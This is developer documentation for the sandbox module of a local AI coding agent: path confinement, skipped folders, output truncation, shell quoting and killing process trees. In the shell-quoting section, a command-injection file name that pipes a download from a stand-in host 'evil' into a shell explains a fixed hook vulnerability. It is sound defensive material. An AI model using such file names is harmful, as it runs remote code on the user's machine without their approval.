# `localagent/sandbox.py` — safety helpers

**Role in the flow:** the model is untrusted. Every file path it names passes through `resolve_inside`;
every program it makes us run passes through `run_command`; every long result passes through `truncate`; every file
name pasted into one of your hook commands passes through `quote_for_shell`; and every "look at all files" operation
goes through `walk_files` (never entering folders such as `node_modules` or `.venv`) or, for what the model sees,
`project_files` (which also honours `.gitignore`).

## Module header and `SKIP_DIRS`
@@ localagent/sandbox.py header @@
- The docstring states the rule. `os` provides `os.walk` and process groups; `re` checks file names; `shlex` quotes
  for `sh`; `signal` stops process groups on Linux/macOS; `subprocess` launches programs; `sys` tells Windows apart;
  `Path` is the path type; `Iterator` types the walkers.
- `SKIP_DIRS` lists folders that are never shown, searched, snapshotted or verified: version control (`.git`, `.hg`,
  `.svn`), Python caches and tools (`__pycache__`, `.mypy_cache`, `.ruff_cache`, `.pytest_cache`, `.tox`, `.nox`,
  `.eggs`, `.hypothesis`, `.ipynb_checkpoints`), virtual environments (`.venv`, `venv`), installed packages
  (`node_modules`, `bower_components`, `__pypackages__`), build output (`target` for Rust and Java, `dist`, `.next`,
  `.nuxt`, `.svelte-kit`, `.angular`, `.turbo`, `.parcel-cache`, `.cache`, `.gradle`, `.dart_tool`, `.terraform`,
  `coverage`, `htmlcov`), editor state (`.idea`, `.vs`) and the agent's own state folder (`.localagent`). Version 0.6
  added the build folders: a Rust project's `target` folder alone holds thousands of files and used to switch `/undo`
  off for the whole project. A skipped folder can still be opened by naming it (`list_files`, `read_file`).
  `build` is deliberately *not* skipped — some projects keep hand-written files there; in a git repository
  `project_files` hides it when `.gitignore` says so.
- `SAFE_WORD` matches file names that need no quotes in either shell (letters, digits, `_ . / \ : + = -`).

## `skip_dir`
@@ localagent/sandbox.py skip_dir @@
- A folder is skipped when it is in `SKIP_DIRS` or is a Python packaging folder (`*.egg-info`), whose name varies.

## `walk_files`
@@ localagent/sandbox.py walk_files @@
- `os.walk` visits one folder at a time and gives the sub-folder names in a list; assigning a filtered list back to
  `dirnames[:]` tells it **not to enter** the skipped ones. That is the speed difference on real projects: a plain
  `rglob("*")` would list all ~100 000 files in a typical `node_modules` before filtering them out.
- Folders and files are sorted, so results are stable (same order every time — good for tests and for the prompt).

## `project_files` — what the model sees
@@ localagent/sandbox.py _in_git_repo @@
- True when the folder, or any folder above it, contains `.git` (a folder normally; a *file* in git worktrees and
  submodules). Checking first avoids starting `git` for folders that are not repositories.

@@ localagent/sandbox.py project_files @@
- In a git repository, asks git for the project's files: `ls-files --cached` (tracked) `--others` (new, not yet added)
  `--exclude-standard` (but not what `.gitignore` excludes), `-z` (names separated by a zero byte, so any file name is
  safe). Git knows every ignore rule exactly — nested `.gitignore` files, your global excludes — so downloads, build
  output and logs that the project ignores never reach the model. On this project that removed 60 llama.cpp DLLs and a
  5 GB model from the file overview.
- Paths inside a skipped folder are still dropped, and so are files `--cached` lists although they were deleted since
  the last commit.
- Falls back to `walk_files` when git is missing, the folder is not a repository, git fails — or git lists nothing at
  all, which happens when the whole folder is ignored (the HTTP server keeps its session workspaces in an ignored
  `sessions/` folder; without the fallback the model would see an empty project).
- Used by the file overview in the prompt, `search` and `outline`. The workspace check and `/undo` keep using
  `walk_files`, because they must also cover files the project ignores.

## `looks_binary`
@@ localagent/sandbox.py looks_binary @@
- Reads the first 8 KB: text files never contain a zero byte, while images, programs and model files almost always do.
  `read_file` refuses such files and `search` skips them — before 0.6, reading a binary file returned thousands of
  garbage characters to the model, and a search over a folder with a 5 GB model file would have loaded it into memory.

## `SandboxError`
@@ localagent/sandbox.py SandboxError @@
- Raised when a path escapes the workspace. Tools turn it into an `ERROR:` string for the model.

## `resolve_inside`
@@ localagent/sandbox.py resolve_inside @@
- Makes the workspace root absolute, joins the requested path to it and calls `resolve()`: this collapses `..`,
  follows symlinks, and — if the request was absolute like `C:\Windows` — discards the root entirely, which is
  exactly what the next check catches.
- The result is allowed only if it *is* the root or the root is one of its parent folders; otherwise it raises.

## `truncate`
@@ localagent/sandbox.py truncate @@
- Short text is returned unchanged. Otherwise the head gets two thirds of the budget, the tail the rest, with a marker
  saying how many characters were dropped. Errors and summaries usually appear at the end of output, so keeping the
  tail matters.

## `shell_argv`
@@ localagent/sandbox.py shell_argv @@
- The one place that decides how a shell command runs on this computer: PowerShell (`-NoProfile` = skip your profile
  script, `-NonInteractive` = never wait for typing, `-Command` = run this text) on Windows, `sh -c` elsewhere. Used by
  the host runner (`run_shell` with `--allow-shell`), hooks, your own `!commands` and a `test_command` from the settings.

## `quote_for_shell`
@@ localagent/sandbox.py quote_for_shell @@
- **A security fix of version 0.6.** Hooks such as `"after_edit": "ruff check {file}"` paste the changed file's name into
  a shell command, and the model chooses file names. A file named `a$(curl evil|sh).py` (perfectly legal on Windows and
  Linux) would have run `curl evil|sh` on your computer, without a question, the moment the model wrote it — this was
  verified with a harmless command before the fix.
- Now the name is quoted: left alone when it contains only safe characters (so ordinary hooks look the same as before);
  otherwise wrapped in single quotes, the one form both shells take completely literally (PowerShell writes a quote
  inside as `''`; `shlex.quote` does the same job for `sh`). A name starting with `-` gets `./` in front, so it is never
  read as an option. Do not put your own quotes around `{file}` in a hook.

## Running programs safely
@@ localagent/sandbox.py kill_tree @@
- Stops a program **and every program it started**: on Windows `taskkill /F /T` (force, whole tree), elsewhere a kill
  signal to the program's process group (see `run_command`). Then the program itself, in case. Errors are ignored —
  it may already have ended.

@@ localagent/sandbox.py _leftover_output @@
- After a kill, collects what the program printed before it died (at most 5 more seconds); when even that blocks, it
  gives up with nothing rather than hanging.

@@ localagent/sandbox.py run_command @@
- Takes a list `argv` (program + arguments), the folder to run in, a timeout, an output cap and optional input text.
- **Never through a shell** (a list, never `shell=True`), so nothing in the arguments is interpreted.
- **No keyboard.** Without `input_text` the program's input is empty (`DEVNULL`). Before 0.6 a program that asked a
  question (`input()`) read from *your* terminal: the agent seemed frozen until the timeout, and your typing went to
  the program. Now `input()` fails at once with `EOFError`, which the model can read and fix. `input_text` is used by
  the Rust checker, which reads the file from its input.
- **A process group of its own** (`CREATE_NEW_PROCESS_GROUP` on Windows, `start_new_session` elsewhere), so a timeout
  or Ctrl+C can stop everything the program started. Before 0.6 a timeout killed only the program itself; a server or
  worker it had started kept the output pipe open and Python waited for it — measured: a 3-second timeout returned
  after 25 seconds, and a model-written server would have hung the agent forever. Now: 3.2 seconds.
- `PYTHONIOENCODING=utf-8` lets Python programs print any character: on Windows a program printing ✓ into a pipe
  otherwise crashes with `UnicodeEncodeError` — a false failure caused by the pipe, not by the code.
- On timeout the tree is killed and exit code 124 (the `timeout` convention) is returned **with whatever the program
  printed before** (often the useful part, e.g. "listening on port 8000"); program not found → 127. On Ctrl+C the tree
  is killed and the interrupt continues. Otherwise the exit code and the output (standard output first, then errors),
  truncated.

> Note: this limits *where* files are touched and *how long* programs run, but a program run on your machine can still
> do anything your user account can. That is why `tools.py` asks for approval before running anything, and why
> `--sandbox docker` exists (see `runners.md`).
